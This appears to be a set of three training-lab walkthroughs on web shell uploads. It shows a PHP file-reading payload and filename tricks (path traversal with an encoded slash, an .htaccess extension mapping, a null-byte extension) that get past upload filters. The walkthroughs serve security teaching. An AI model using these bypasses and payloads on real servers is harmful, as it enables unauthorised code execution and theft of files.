## [Scenario 1] Lab: Web shell upload via path traversal

1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
3. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
    
    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
4. Upload this script as your avatar. Notice that the website doesn't seem to prevent you from uploading PHP files.
5. In Burp Repeater, go to the tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that instead of executing the script and returning the output, the server has just returned the contents of the PHP file as plain text.
6. In Burp's proxy history, find the `POST /my-account/avatar` request that was used to submit the file upload and send it to Burp Repeater.
7. In Burp Repeater, go to the tab containing the `POST /my-account/avatar` request and find the part of the request body that relates to your PHP file. In the `Content-Disposition` header, change the `filename` to include a directory traversal sequence:
    
    `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
8. Send the request. Notice that the response says `The file avatars/exploit.php has been uploaded.` This suggests that the server is stripping the directory traversal sequence from the file name.
9. Obfuscate the directory traversal sequence by URL encoding the forward slash (`/`) character, resulting in:
    
    `filename="..%2fexploit.php"`
10. Send the request and observe that the message now says `The file avatars/../exploit.php has been uploaded.` This indicates that the file name is being URL decoded by the server.
11. In the browser, go back to your account page.
12. In Burp's proxy history, find the `GET /files/avatars/..%2fexploit.php` request. Observe that Carlos's secret was returned in the response. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy (`/files`), and subsequently executed by the server. Note that this means you can also request this file using `GET /files/exploit.php`.
13. Submit the secret to solve the lab.

## [Scenario 2] Lab: Web shell upload via extension blacklist bypass

1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
3. On your system, create a file called `exploit.php` containing a script for fetching the contents of Carlos's secret. For example:
    
    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
4. Attempt to upload this script as your avatar. The response indicates that you are not allowed to upload files with a `.php` extension.
5. In Burp's proxy history, find the `POST /my-account/avatar` request that was used to submit the file upload. In the response, notice that the headers reveal that you're talking to an Apache server. Send this request to Burp Repeater.
6. In Burp Repeater, go to the tab for the `POST /my-account/avatar` request and find the part of the body that relates to your PHP file. Make the following changes:
    - Change the value of the `filename` parameter to `.htaccess`.
    - Change the value of the `Content-Type` header to `text/plain`.
    - Replace the contents of the file (your PHP payload) with the following Apache directive:
        
        `AddType application/x-httpd-php .l33t`
        
        This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.
        
7. Send the request and observe that the file was successfully uploaded.
8. Use the back arrow in Burp Repeater to return to the original request for uploading your PHP exploit.
9. Change the value of the `filename` parameter from `exploit.php` to `exploit.l33t`. Send the request again and notice that the file was uploaded successfully.
10. Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.l33t` and send the request. Observe that Carlos's secret was returned in the response. Thanks to our malicious `.htaccess` file, the `.l33t` file was executed as if it were a `.php` file.
11. Submit the secret to solve the lab.

## [Scenario 3:] Lab: Web shell upload via obfuscated file extension

1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
3. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
    
    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
4. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload JPG and PNG files.
5. In Burp's proxy history, find the `POST /my-account/avatar` request that was used to submit the file upload. Send this to Burp Repeater.
6. In Burp Repeater, go to the tab for the `POST /my-account/avatar` request and find the part of the body that relates to your PHP file. In the `Content-Disposition` header, change the value of the `filename` parameter to include a URL encoded null byte, followed by the `.jpg` extension:
    
    `filename="exploit.php%00.jpg"`
7. Send the request and observe that the file was successfully uploaded. Notice that the message refers to the file as `exploit.php`, suggesting that the null byte and `.jpg` extension have been stripped.
8. Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that Carlos's secret was returned in the response.
9. Submit the secret to solve the lab.
